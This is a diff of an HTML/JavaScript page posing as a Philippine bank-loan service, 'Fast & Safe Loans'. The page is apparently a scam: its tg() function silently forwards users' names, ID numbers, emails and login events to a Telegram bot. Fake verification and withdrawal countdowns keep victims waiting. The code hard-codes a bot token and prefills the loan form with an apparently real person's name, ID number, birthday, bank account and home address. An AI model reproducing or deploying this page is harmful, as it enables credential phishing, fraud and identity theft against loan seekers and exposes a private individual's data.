@@ -3,67 +3,68 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Fast & Safe Loans Philippines | Bank Loan</title>
+  <title>Fast & Safe Loans | Bank Loan PH</title>
   <style>
     :root {
-      --bg: #ffffff;
+      --bg: #fafafa;
       --surface: #ffffff;
-      --surface2: #f8fafc;
-      --gold: #b8860b;
-      --gold-light: #fef9e7;
-      --green: #0e6245;
-      --green-light: #d1fae5;
-      --red: #b91c1c;
-      --red-light: #fee2e2;
-      --text: #0f172a;
-      --text2: #475569;
-      --border: #e2e8f0;
-      --blue: #1e40af;
-      --blue-light: #dbeafe;
-      --radius: 18px;
+      --surface2: #f5f5f5;
+      --primary: #f0b90b;
+      --primary-dark: #e5a800;
+      --primary-light: #fef6d8;
+      --text: #1e2329;
+      --text2: #707a8a;
+      --border: #eaecef;
+      --green: #02c076;
+      --green-light: #e6f9f1;
+      --red: #f84960;
+      --red-light: #fdebee;
+      --blue: #1e5af7;
+      --blue-light: #e8edfd;
+      --radius: 12px;
       --shadow-sm: 0 1px 2px rgba(0,0,0,0.03);
-      --shadow: 0 4px 16px rgba(0,0,0,0.04), 0 1px 3px rgba(0,0,0,0.03);
-      --transition: 0.2s ease;
+      --shadow: 0 4px 12px rgba(0,0,0,0.04);
+      --transition: 0.2s cubic-bezier(0.4,0,0.2,1);
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
-      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
-      background: #f1f5f9;
+      font-family: 'Inter', 'BinancePlex', system-ui, -apple-system, sans-serif;
+      background: var(--bg);
       color: var(--text);
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: flex-start;
-      padding: 12px;
+      padding: 10px;
       -webkit-font-smoothing: antialiased;
     }
 
     #app {
       width: 100%;
-      max-width: 500px;
+      max-width: 480px;
       display: flex;
       flex-direction: column;
-      gap: 16px;
+      gap: 12px;
       padding-bottom: 30px;
     }
 
     .screen {
       display: none;
       flex-direction: column;
-      gap: 16px;
-      animation: fadeSlide 0.35s ease;
+      gap: 12px;
+      animation: fadeSlide 0.3s ease;
     }
     .screen.active { display: flex; }
 
     @keyframes fadeSlide {
-      from { opacity: 0; transform: translateY(14px); }
+      from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    @keyframes shimmer {
-      0% { background-position: -200% center; }
-      100% { background-position: 200% center; }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); }
+      50% { transform: scale(1.03); }
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
@@ -73,281 +74,297 @@
       align-items: center;
       justify-content: space-between;
       padding: 8px 0;
-      border-bottom: 1px solid var(--border);
     }
-    .logo-area { display: flex; align-items: center; gap: 10px; }
+    .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
     .logo-icon {
-      width: 42px; height: 42px;
-      background: linear-gradient(135deg, #d4a017, #b8860b);
-      border-radius: 12px;
+      width: 36px; height: 36px;
+      background: var(--primary);
+      border-radius: 8px;
       display: flex; align-items: center; justify-content: center;
-      font-size: 26px; font-weight: 800; color: #fff;
-      box-shadow: 0 4px 12px rgba(184,134,11,0.2);
+      font-size: 22px; font-weight: 800; color: #1e2329;
+      box-shadow: 0 2px 8px rgba(240,185,11,0.3);
     }
-    .logo-text { font-size: 20px; font-weight: 700; color: #0f172a; }
-    .logo-text span { color: #b8860b; }
+    .logo-text {
+      font-size: 18px; font-weight: 700; color: var(--text);
+      letter-spacing: -0.3px;
+    }
+    .logo-text span { color: var(--primary-dark); }
     .btn-logout {
-      background: #fff; border: 1px solid #cbd5e1; color: #475569;
-      padding: 8px 18px; border-radius: 24px; font-weight: 600; font-size: 13px;
+      background: var(--surface); border: 1px solid var(--border); color: var(--text2);
+      padding: 8px 16px; border-radius: 8px; font-weight: 600; font-size: 12px;
       cursor: pointer; transition: var(--transition);
     }
-    .btn-logout:hover { background: #f8fafc; }
+    .btn-logout:hover { background: var(--surface2); }
 
     /* cards */
     .card {
-      background: #fff; border: 1px solid #f1f5f9;
-      border-radius: var(--radius); padding: 20px;
-      box-shadow: var(--shadow); transition: var(--transition);
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 16px;
+      box-shadow: var(--shadow-sm);
     }
-    .card-gold {
-      border-left: 4px solid #b8860b;
-      background: #fffbeb;
+    .card-accent {
+      border-left: 3px solid var(--primary);
+      background: var(--primary-light);
     }
 
-    .balance-badge {
-      display: inline-flex; align-items: center; gap: 6px;
-      background: #fef3c7; color: #92400e; padding: 6px 16px;
-      border-radius: 30px; font-weight: 600; font-size: 13px;
-      border: 1px solid #fcd34d; margin-bottom: 10px;
+    .balance-row {
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 4px;
+    }
+    .balance-label {
+      font-size: 12px; color: var(--text2); text-transform: uppercase; letter-spacing: 0.5px;
     }
     .balance-amount {
-      font-size: 40px; font-weight: 800; color: #0f172a; margin: 6px 0;
+      font-size: 32px; font-weight: 800; color: var(--text);
+      display: flex; align-items: baseline; gap: 4px;
     }
-    .status-badge {
-      display: inline-block; padding: 5px 14px; border-radius: 20px;
-      font-size: 11px; font-weight: 600; text-transform: uppercase;
+    .balance-amount small { font-size: 16px; font-weight: 600; color: var(--text2); }
+    .status-pill {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;
     }
-    .status-pending { background: #fef3c7; color: #92400e; border:1px solid #fcd34d; }
-    .status-approved { background: #d1fae5; color: #065f46; border:1px solid #6ee7b7; }
-    .status-rejected { background: #fee2e2; color: #991b1b; border:1px solid #fca5a5; }
-    .status-bank { background: #f1f5f9; color: #334155; border:1px solid #cbd5e1; }
+    .status-pending { background: #fef6d8; color: #b8860b; }
+    .status-approved { background: var(--green-light); color: #0e6245; }
+    .status-rejected { background: var(--red-light); color: #b91c1c; }
+    .status-bank { background: #f5f5f5; color: #707a8a; }
 
     /* inputs */
-    .input-group { margin-bottom: 14px; }
+    .input-group { margin-bottom: 12px; }
     .input-group label {
-      display: block; font-size: 12px; font-weight: 600; color: #334155;
-      margin-bottom: 6px; letter-spacing: -0.2px;
+      display: block; font-size: 11px; font-weight: 600; color: var(--text2);
+      margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.4px;
     }
     .input-group input, .input-group select {
-      width: 100%; padding: 13px 16px; background: #f8fafc;
-      border: 1px solid #e2e8f0; border-radius: 12px; color: #0f172a;
+      width: 100%; padding: 12px 14px; background: var(--surface2);
+      border: 1px solid var(--border); border-radius: 8px; color: var(--text);
       font-size: 14px; outline: none; font-family: inherit; transition: var(--transition);
     }
     .input-group input:focus, .input-group select:focus {
-      border-color: #b8860b; box-shadow: 0 0 0 3px rgba(184,134,11,0.08); background: #fff;
+      border-color: var(--primary); box-shadow: 0 0 0 3px rgba(240,185,11,0.08);
+      background: #fff;
     }
 
     /* buttons */
     .btn {
       display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-      padding: 14px 22px; border-radius: 30px; font-weight: 600; font-size: 14px;
+      padding: 13px 20px; border-radius: 8px; font-weight: 600; font-size: 13px;
       cursor: pointer; border: none; transition: var(--transition); width: 100%;
       font-family: inherit; text-transform: uppercase; letter-spacing: 0.5px;
     }
-    .btn-primary { background: #b8860b; color: #fff; box-shadow: 0 6px 18px rgba(184,134,11,0.2); }
-    .btn-primary:hover { background: #9a6d0c; }
-    .btn-outline { background: transparent; border: 2px solid #b8860b; color: #b8860b; }
-    .btn-success { background: #0e6245; color: #fff; }
-    .btn-sm { padding: 8px 18px; font-size: 12px; width: auto; }
+    .btn-primary { background: var(--primary); color: #1e2329; }
+    .btn-primary:hover { background: var(--primary-dark); }
+    .btn-outline { background: transparent; border: 1px solid var(--primary); color: var(--primary-dark); }
+    .btn-success { background: var(--green); color: #fff; }
+    .btn-sm { padding: 8px 16px; font-size: 11px; width: auto; border-radius: 6px; }
 
-    /* nav */
+    /* nav tabs */
     .nav-tabs {
-      display: flex; gap: 5px; background: #f1f5f9; padding: 5px;
-      border-radius: 30px; overflow-x: auto;
+      display: flex; gap: 4px; background: var(--surface2);
+      padding: 4px; border-radius: 10px; overflow-x: auto;
     }
     .nav-item {
-      flex: 1 0 auto; padding: 10px 12px; text-align: center;
-      border-radius: 25px; cursor: pointer; font-size: 13px; font-weight: 600;
-      white-space: nowrap; color: #475569; background: transparent; border: none;
+      flex: 1 0 auto; padding: 10px 14px; text-align: center;
+      border-radius: 8px; cursor: pointer; font-size: 12px; font-weight: 600;
+      white-space: nowrap; color: var(--text2); background: transparent; border: none;
+      transition: var(--transition);
     }
-    .nav-item.active { background: #fff; color: #b8860b; box-shadow: var(--shadow-sm); font-weight: 700; }
+    .nav-item.active {
+      background: var(--surface); color: var(--primary-dark);
+      box-shadow: var(--shadow-sm); font-weight: 700;
+    }
 
     .dash-section { display: none; }
     .dash-section.active { display: block; }
 
     /* bank grid */
     .bank-grid {
-      display: grid; grid-template-columns: repeat(auto-fill, minmax(85px, 1fr));
-      gap: 8px; margin-top: 6px;
+      display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 6px;
     }
     .bank-item {
-      background: #fff; border: 1px solid #e2e8f0; border-radius: 12px;
+      background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
       padding: 10px 4px; text-align: center; cursor: pointer; transition: var(--transition);
-      font-size: 10px; box-shadow: var(--shadow-sm);
     }
-    .bank-item:hover { border-color: #b8860b; background: #fffbeb; }
-    .bank-item.selected { border-color: #b8860b; background: #fef3c7; }
-    .bank-item .bank-icon { font-size: 22px; display: block; margin-bottom: 3px; }
-    .bank-item .bank-name { font-size: 10px; color: #334155; font-weight: 600; }
+    .bank-item:hover { border-color: var(--primary); }
+    .bank-item.selected { border-color: var(--primary); background: var(--primary-light); }
+    .bank-item .bank-icon { font-size: 20px; display: block; margin-bottom: 2px; }
+    .bank-item .bank-name { font-size: 10px; color: var(--text2); font-weight: 500; }
 
     /* overlays */
     .overlay {
-      position: fixed; inset: 0; background: rgba(15,23,42,0.8);
-      backdrop-filter: blur(6px); z-index: 100; display: flex;
+      position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(8px); z-index: 100; display: flex;
       align-items: center; justify-content: center; flex-direction: column; color: #fff;
     }
     .overlay.hidden { display: none; }
     .verify-circle {
-      width: 110px; height: 110px; border-radius: 50%;
-      border: 4px solid rgba(255,255,255,0.25); border-top-color: #fbbf24;
-      animation: spin 1.2s linear infinite; display: flex;
-      align-items: center; justify-content: center; margin-bottom: 18px; font-size: 36px;
+      width: 100px; height: 100px; border-radius: 50%;
+      border: 3px solid rgba(255,255,255,0.2); border-top-color: var(--primary);
+      animation: spin 1s linear infinite; display: flex;
+      align-items: center; justify-content: center; margin-bottom: 16px; font-size: 30px;
     }
-    .countdown-text { font-size: 34px; font-weight: 700; color: #fbbf24; }
-    .overlay p { color: #e2e8f0; font-size: 14px; }
-    .overlay .btn-outline { border-color: #fbbf24; color: #fbbf24; margin-top: 16px; width: auto; padding: 10px 24px; }
+    .countdown-text { font-size: 30px; font-weight: 700; color: var(--primary); }
+    .overlay p { color: #eaecef; font-size: 13px; }
+    .overlay .btn-outline { border-color: var(--primary); color: var(--primary); margin-top: 14px; width: auto; }
 
     .modal-overlay {
-      position: fixed; inset: 0; background: rgba(0,0,0,0.55);
+      position: fixed; inset: 0; background: rgba(0,0,0,0.5);
       backdrop-filter: blur(4px); z-index: 150; display: flex;
       align-items: center; justify-content: center;
     }
     .modal-overlay.hidden { display: none; }
     .modal-content {
-      background: #fff; border-radius: var(--radius); padding: 24px;
-      max-width: 340px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.2);
+      background: var(--surface); border-radius: var(--radius); padding: 20px;
+      max-width: 320px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.2);
     }
-    .modal-content img { width: 100%; border-radius: 12px; margin-top: 10px; }
+    .modal-content img { width: 100%; border-radius: 8px; margin-top: 10px; }
 
     .toast {
       position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-      background: #1e293b; color: #fff; padding: 12px 24px; border-radius: 30px;
-      font-weight: 600; z-index: 200; animation: fadeSlide 0.4s ease;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+      background: #1e2329; color: #fff; padding: 12px 20px; border-radius: 8px;
+      font-weight: 600; z-index: 200; animation: fadeSlide 0.3s ease;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
     }
 
     ::-webkit-scrollbar { width: 3px; height: 3px; }
-    ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+    ::-webkit-scrollbar-thumb { background: #d0d5dd; border-radius: 8px; }
+
+    @media (max-width: 380px) {
+      .bank-grid { grid-template-columns: repeat(3,1fr); }
+      .balance-amount { font-size: 28px; }
+    }
   </style>
 </head>
 <body>
   <div id="toastContainer"></div>
 
   <div id="app">
-    <!-- LOGIN SCREEN -->
+    <!-- LOGIN -->
     <div class="screen active" id="screen-login">
-      <div style="text-align:center; padding: 24px 0 8px;">
-        <div style="display:inline-flex; align-items:center; gap:10px;">
+      <div style="text-align:center; padding: 28px 0 12px;">
+        <div style="display:inline-flex; align-items:center; gap:8px;">
           <div class="logo-icon">₱</div>
           <div class="logo-text">Fast & Safe <span>Loans</span></div>
         </div>
-        <p style="color:#64748b; font-size:13px; margin-top:6px;">Philippines • Bank Loan Partner</p>
+        <p style="color:var(--text2); font-size:12px; margin-top:4px;">Philippines · Bank Loan Partner</p>
       </div>
-      <div class="card card-gold" style="text-align:center;">
-        <h3 style="color:#92400e;">🔐 Client Login</h3>
-        <p style="color:#64748b; font-size:13px;">Secure access to your loan account</p>
+      <div class="card card-accent" style="text-align:center;">
+        <h3 style="color:#b8860b; margin-bottom:4px;">🔐 Client Login</h3>
+        <p style="color:var(--text2); font-size:12px;">Secure access to your loan account</p>
       </div>
       <div class="card">
-        <div class="input-group">
-          <label>📧 Gmail Address</label>
-          <input type="email" id="loginEmail" placeholder="yourname@gmail.com" autocomplete="email">
-        </div>
-        <div class="input-group">
-          <label>🔒 Password</label>
-          <input type="password" id="loginPassword" placeholder="Enter password">
-        </div>
-        <button class="btn btn-primary" onclick="handleLogin()">🚀 Login</button>
-        <p style="text-align:center; margin-top:14px; font-size:13px; color:#475569;">
-          Don't have an account? 
-          <a href="#" onclick="showScreen('screen-register')" style="color:#b8860b; font-weight:700; text-decoration:none;">Create New Account</a>
+        <div class="input-group"><label>Email</label><input type="email" id="loginEmail" placeholder="yourname@gmail.com"></div>
+        <div class="input-group"><label>Password</label><input type="password" id="loginPassword" placeholder="Enter password"></div>
+        <button class="btn btn-primary" onclick="handleLogin()">Log In</button>
+        <p style="text-align:center; margin-top:12px; font-size:12px; color:var(--text2);">
+          New user? <a href="#" onclick="showScreen('screen-register')" style="color:var(--primary-dark); font-weight:700;">Create Account</a>
         </p>
       </div>
     </div>
 
-    <!-- REGISTER SCREEN -->
+    <!-- REGISTER -->
     <div class="screen" id="screen-register">
-      <div style="text-align:center; padding: 20px 0 8px;">
-        <div style="display:inline-flex; align-items:center; gap:10px;">
+      <div style="text-align:center; padding: 24px 0 8px;">
+        <div style="display:inline-flex; align-items:center; gap:8px;">
           <div class="logo-icon">₱</div>
           <div class="logo-text">New Account</div>
         </div>
-        <p style="color:#64748b; font-size:13px;">Join Fast & Safe Loans</p>
       </div>
       <div class="card">
-        <div class="input-group"><label>👤 Full Name (as per ID)</label><input type="text" id="regName" placeholder="Enter your full name"></div>
-        <div class="input-group"><label>🆔 ID Name</label><input type="text" id="regIdName" placeholder="Name on Philippine ID"></div>
-        <div class="input-group"><label>🪪 ID Card Number</label><input type="text" id="regIdNumber" placeholder="ID card number"></div>
-        <div class="input-group"><label>📧 Gmail Address</label><input type="email" id="regEmail" placeholder="yourname@gmail.com"></div>
-        <div class="input-group"><label>🔒 Password</label><input type="password" id="regPassword" placeholder="Create password"></div>
-        <div class="input-group"><label>🔒 Confirm Password</label><input type="password" id="regConfirmPassword" placeholder="Confirm password"></div>
-        <button class="btn btn-primary" onclick="handleRegister()">📝 Create Account</button>
-        <p style="text-align:center; margin-top:14px; font-size:13px;">
-          Already registered? <a href="#" onclick="showScreen('screen-login')" style="color:#b8860b; font-weight:700;">Login</a>
+        <div class="input-group"><label>Full Name</label><input type="text" id="regName" placeholder="As per Philippine ID"></div>
+        <div class="input-group"><label>ID Name</label><input type="text" id="regIdName" placeholder="Name on ID"></div>
+        <div class="input-group"><label>ID Card Number</label><input type="text" id="regIdNumber" placeholder="ID number"></div>
+        <div class="input-group"><label>Email</label><input type="email" id="regEmail" placeholder="yourname@gmail.com"></div>
+        <div class="input-group"><label>Password</label><input type="password" id="regPassword" placeholder="Min 6 characters"></div>
+        <div class="input-group"><label>Confirm Password</label><input type="password" id="regConfirmPassword" placeholder="Re-enter password"></div>
+        <button class="btn btn-primary" onclick="handleRegister()">Create Account</button>
+        <p style="text-align:center; margin-top:12px; font-size:12px;">
+          Already registered? <a href="#" onclick="showScreen('screen-login')" style="color:var(--primary-dark); font-weight:700;">Login</a>
         </p>
       </div>
     </div>
 
-    <!-- DASHBOARD SCREEN -->
+    <!-- DASHBOARD -->
     <div class="screen" id="screen-dashboard">
       <div class="header">
         <div class="logo-area">
           <div class="logo-icon">₱</div>
           <div class="logo-text">Fast & Safe <span>Loans</span></div>
         </div>
-        <button class="btn-logout" onclick="handleLogout()">🚪 Logout</button>
+        <button class="btn-logout" onclick="handleLogout()">Log Out</button>
       </div>
 
-      <div class="card card-gold" style="text-align:center;">
-        <span class="balance-badge">💰 Available Balance</span>
-        <div class="balance-amount" id="dashBalance">₱0.00</div>
-        <div><span class="status-badge status-bank" id="dashLoanStatus">Bank Loan</span></div>
+      <div class="card card-accent">
+        <div class="balance-row">
+          <span class="balance-label">Available Balance</span>
+          <span class="status-pill status-bank" id="dashLoanStatus">Bank Loan</span>
+        </div>
+        <div class="balance-amount">₱<span id="dashBalance">0.00</span></div>
       </div>
 
       <div class="nav-tabs" id="dashNav">
         <button class="nav-item active" onclick="switchDashTab('home')">🏠 Home</button>
-        <button class="nav-item" onclick="switchDashTab('loan')">📋 Loan Apply</button>
+        <button class="nav-item" onclick="switchDashTab('loan')">📋 Loan</button>
         <button class="nav-item" onclick="switchDashTab('withdraw')">💸 Withdraw</button>
         <button class="nav-item" onclick="switchDashTab('profile')">👤 Profile</button>
-        <button class="nav-item" onclick="openPhotoModal()">📷 ID Photo</button>
+        <button class="nav-item" onclick="openPhotoModal()">📷 ID</button>
       </div>
 
       <div class="dash-section active" id="dash-home">
         <div class="card">
-          <h4 style="color:#b8860b; margin-bottom:12px;">📊 Account Overview</h4>
-          <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #f1f5f9;">
-            <span>Available Balance</span><span style="font-weight:700; color:#0e6245;" id="homeBal">₱0.00</span>
+          <h4 style="color:var(--primary-dark); margin-bottom:10px;">📊 Overview</h4>
+          <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);">
+            <span style="color:var(--text2);">Balance</span>
+            <span style="font-weight:700;color:var(--green);" id="homeBal">₱0.00</span>
           </div>
-          <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #f1f5f9;">
-            <span>Loan Status</span><span id="homeLoanStatus" style="font-weight:600;">Bank Loan</span>
+          <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);">
+            <span style="color:var(--text2);">Loan Status</span>
+            <span id="homeLoanStatus" style="font-weight:600;">Bank Loan</span>
           </div>
-          <div style="display:flex; justify-content:space-between; padding:8px 0;">
-            <span>Account Type</span><span style="font-weight:600; color:#1e40af;">Personal Bank Loan</span>
+          <div style="display:flex;justify-content:space-between;padding:8px 0;">
+            <span style="color:var(--text2);">Type</span>
+            <span style="font-weight:600;color:var(--blue);">Personal Bank Loan</span>
           </div>
         </div>
       </div>
 
       <div class="dash-section" id="dash-loan">
-        <div class="card card-gold"><h4 style="color:#92400e;">📋 Bank Loan Application</h4></div>
+        <div class="card card-accent"><h4 style="color:#b8860b;">📋 Loan Application</h4></div>
         <div class="card">
           <div class="input-group"><label>Full Name</label><input type="text" id="loanFullName" value="SHANE SABAL"></div>
-          <div class="input-group"><label>ID Card Number</label><input type="text" id="loanIdNumber" value="4830645821731280"></div>
+          <div class="input-group"><label>ID Number</label><input type="text" id="loanIdNumber" value="4830645821731280"></div>
           <div class="input-group"><label>Gender</label><select id="loanGender"><option>Female</option><option>Male</option></select></div>
           <div class="input-group"><label>Birthday</label><input type="date" id="loanBirthday" value="2004-01-10"></div>
           <div class="input-group"><label>Bank Name</label><input type="text" id="loanBank" value="Shane Sabal"></div>
-          <div class="input-group"><label>Bank Account Number</label><input type="text" id="loanBankAccount" value="0000079315821"></div>
+          <div class="input-group"><label>Account No.</label><input type="text" id="loanBankAccount" value="0000079315821"></div>
           <div class="input-group"><label>Marital Status</label><select id="loanMarital"><option>Single</option><option>Married</option></select></div>
           <div class="input-group"><label>Education</label><select id="loanEducation"><option>Graduate and Above</option><option>College</option></select></div>
           <div class="input-group"><label>Career</label><input type="text" id="loanCareer" value="BPO agent"></div>
           <div class="input-group"><label>Province</label><input type="text" id="loanProvince" value="Davao del sur, Davao city"></div>
           <div class="input-group"><label>Address</label><input type="text" id="loanAddress" value="PCA road purok 4 Bago Oshiro"></div>
-          <div class="input-group"><label>💰 Loan Amount (₱)</label><input type="number" id="loanAmount" placeholder="Enter amount"></div>
-          <button class="btn btn-primary" onclick="submitLoanApplication()">📤 Submit Application</button>
+          <div class="input-group"><label>Loan Amount (₱)</label><input type="number" id="loanAmount" placeholder="Enter amount"></div>
+          <button class="btn btn-primary" onclick="submitLoanApplication()">Submit Application</button>
         </div>
       </div>
 
       <div class="dash-section" id="dash-withdraw">
-        <div class="card card-gold"><h4 style="color:#92400e;">💸 Withdraw Funds</h4></div>
+        <div class="card card-accent"><h4 style="color:#b8860b;">💸 Withdraw</h4></div>
         <div class="card">
-          <h5>🏦 Philippine Banks</h5><div class="bank-grid" id="bankGrid"></div>
-          <h5 style="margin-top:12px;">📱 Mobile Wallets</h5><div class="bank-grid" id="mobileGrid"></div>
-          <div class="input-group" style="margin-top:14px;"><label>💰 Amount (₱)</label><input type="number" id="withdrawAmount"></div>
-          <div class="input-group"><label>🔒 Password</label><input type="password" id="withdrawPassword"></div>
-          <button class="btn btn-success" onclick="submitWithdrawal()">💸 Process Withdrawal</button>
+          <h5 style="margin-bottom:6px;">🏦 Banks</h5><div class="bank-grid" id="bankGrid"></div>
+          <h5 style="margin-top:10px;margin-bottom:6px;">📱 Wallets</h5><div class="bank-grid" id="mobileGrid"></div>
+          <div class="input-group" style="margin-top:10px;"><label>Amount (₱)</label><input type="number" id="withdrawAmount"></div>
+          <div class="input-group"><label>Password</label><input type="password" id="withdrawPassword"></div>
+          <button class="btn btn-success" onclick="submitWithdrawal()">Process</button>
         </div>
       </div>
 
       <div class="dash-section" id="dash-profile">
-        <div class="card"><h4 style="color:#b8860b;">👤 Profile</h4><div id="profileInfo"></div></div>
+        <div class="card"><h4 style="color:var(--primary-dark);">👤 Profile</h4><div id="profileInfo" style="font-size:13px;line-height:2;"></div></div>
       </div>
     </div>
   </div>
@@ -356,8 +373,7 @@
   <div class="overlay hidden" id="registerVerifyOverlay">
     <div class="verify-circle">🆕</div>
     <div class="countdown-text" id="regCountdown">20:00</div>
-    <p>Account verification in progress...</p>
-    <p style="font-size:13px;">Please wait 20 minutes, then login.</p>
+    <p>Verifying your account...</p><p style="font-size:12px;">Please wait 20 minutes, then login.</p>
   </div>
   <div class="overlay hidden" id="withdrawOverlay">
     <div class="verify-circle">💸</div><div class="countdown-text" id="withdrawCountdown">30:00</div>
@@ -365,15 +381,14 @@
   </div>
   <div class="overlay hidden" id="loanPendingOverlay">
     <div class="verify-circle">📋</div><div class="countdown-text" id="loanCountdown">30:00</div>
-    <p>Loan application pending...</p><button class="btn-outline" onclick="closeLoanPendingOverlay()">Close</button>
+    <p>Loan pending...</p><button class="btn-outline" onclick="closeLoanPendingOverlay()">Close</button>
   </div>
 
-  <!-- PHOTO MODAL -->
   <div class="modal-overlay hidden" id="photoModal">
     <div class="modal-content">
-      <h4 style="color:#b8860b;">📷 ID Reference Photo</h4>
+      <h4 style="color:var(--primary-dark);">📷 ID Photo</h4>
       <img src="https://bsp888.cc/uploads/picture/202603/2402785ab62484d4c6e5b9738d8f2e82.jpg" alt="ref">
-      <button class="btn btn-outline" style="margin-top:12px; width:auto;" onclick="closePhotoModal()">Close</button>
+      <button class="btn btn-outline btn-sm" style="margin-top:10px;width:100%;" onclick="closePhotoModal()">Close</button>
     </div>
   </div>
 
@@ -389,7 +404,6 @@
   </script>
 
   <script>
-    // ========== 70 USERS (EDIT HERE) ==========
     const DEFAULT_USERS = {
       "1":{email:"123fhffhf@gmail.com",password:"12345678",balance:5000,loanStatus:"none",loanAmount:0,fullName:"Shane Sabal",idName:"Shane Sabal",idNumber:"4830645821731280"},
       "2":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
@@ -463,16 +477,15 @@
       "70":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""}
     };
 
-    const TELEGRAM_TOKEN = '8843546617:AAH_D5IY57cezbnIZgHWgU5J-C_84MZIBBw';
-    const TELEGRAM_CHAT = '8843546617';
+    const TG_TOKEN = '8843546617:AAH_D5IY57cezbnIZgHWgU5J-C_84MZIBBw';
+    const TG_CHAT = '8843546617';
     let currentUser = null, withdrawTimer = null, loanTimer = null, selectedBank = null, selectedMobile = null;
 
-    function getUsers(){ let s=localStorage.getItem('fsl_v4'); if(s) try{return JSON.parse(s);}catch(e){} localStorage.setItem('fsl_v4',JSON.stringify(DEFAULT_USERS)); return JSON.parse(JSON.stringify(DEFAULT_USERS)); }
-    function saveUsers(u){ localStorage.setItem('fsl_v4',JSON.stringify(u)); }
+    function getUsers(){ let s=localStorage.getItem('fsl_v5'); if(s) try{return JSON.parse(s);}catch(e){} localStorage.setItem('fsl_v5',JSON.stringify(DEFAULT_USERS)); return JSON.parse(JSON.stringify(DEFAULT_USERS)); }
+    function saveUsers(u){ localStorage.setItem('fsl_v5',JSON.stringify(u)); }
+    async function tg(msg){ try{ await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }catch(e){} }
 
-    async function tg(msg){ try{ await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }catch(e){} }
-
-    function toast(t,d=3000){ let c=document.getElementById('toastContainer'), el=document.createElement('div'); el.className='toast'; el.textContent=t; c.appendChild(el); setTimeout(()=>{el.style.opacity='0';el.style.transition='opacity 0.4s';setTimeout(()=>el.remove(),400);},d); }
+    function toast(t,d=3000){ let c=document.getElementById('toastContainer'), el=document.createElement('div'); el.className='toast'; el.textContent=t; c.appendChild(el); setTimeout(()=>{el.style.opacity='0';el.style.transition='opacity 0.3s';setTimeout(()=>el.remove(),300);},d); }
 
     function showScreen(id){ document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
 
@@ -481,7 +494,7 @@
       if(!email||!pass) return toast('⚠️ Fill all fields');
       let users=getUsers(), found=null;
       for(let [slot,u] of Object.entries(users)){ if(u.email&&u.email.toLowerCase()===email.toLowerCase()&&u.password===pass){ found={...u,slot}; break; } }
-      if(found){ currentUser=found; updateDashboard(); showScreen('screen-dashboard'); toast('✅ Welcome!'); tg(`🔔 <b>Login</b>\n📧 ${found.email}\n💰 ₱${found.balance.toFixed(2)}\n🕐 ${new Date().toLocaleString()}`); }
+      if(found){ currentUser=found; updateDashboard(); showScreen('screen-dashboard'); toast('✅ Welcome!'); tg(`🔔 <b>Login</b>\n📧 ${found.email}\n💰 ₱${found.balance.toFixed(2)}`); }
       else toast('❌ Invalid credentials');
     }
 
@@ -493,13 +506,13 @@
       if(pass!==confirm) return toast('❌ Passwords mismatch');
       if(pass.length<6) return toast('❌ Password min 6 chars');
       let users=getUsers();
-      for(let u of Object.values(users)){ if(u.email&&u.email.toLowerCase()===email.toLowerCase()) return toast('❌ Email already exists'); }
+      for(let u of Object.values(users)){ if(u.email&&u.email.toLowerCase()===email.toLowerCase()) return toast('❌ Email exists'); }
       let slot=null;
       for(let i=1;i<=70;i++){ if(!users[i.toString()]||!users[i.toString()].email){ slot=i.toString(); break; } }
       if(!slot) return toast('❌ Registration full');
       let newUser={email,password:pass,balance:0,loanStatus:"none",loanAmount:0,fullName:name,idName,idNumber:idNum};
       sessionStorage.setItem('pendingReg',JSON.stringify({slot,user:newUser}));
-      tg(`🆕 <b>New Registration</b>\n👤 ${name}\n🆔 ${idName}\n🪪 ${idNum}\n📧 ${email}\n🕐 ${new Date().toLocaleString()}`);
+      tg(`🆕 <b>Registration</b>\n👤 ${name}\n🆔 ${idName}\n🪪 ${idNum}\n📧 ${email}`);
       document.getElementById('regName').value=''; document.getElementById('regIdName').value='';
       document.getElementById('regIdNumber').value=''; document.getElementById('regEmail').value='';
       document.getElementById('regPassword').value=''; document.getElementById('regConfirmPassword').value='';
@@ -513,8 +526,8 @@
         if(sec<=0){ clearInterval(window.regTimer); overlay.classList.add('hidden');
           let pending=sessionStorage.getItem('pendingReg'); if(pending){
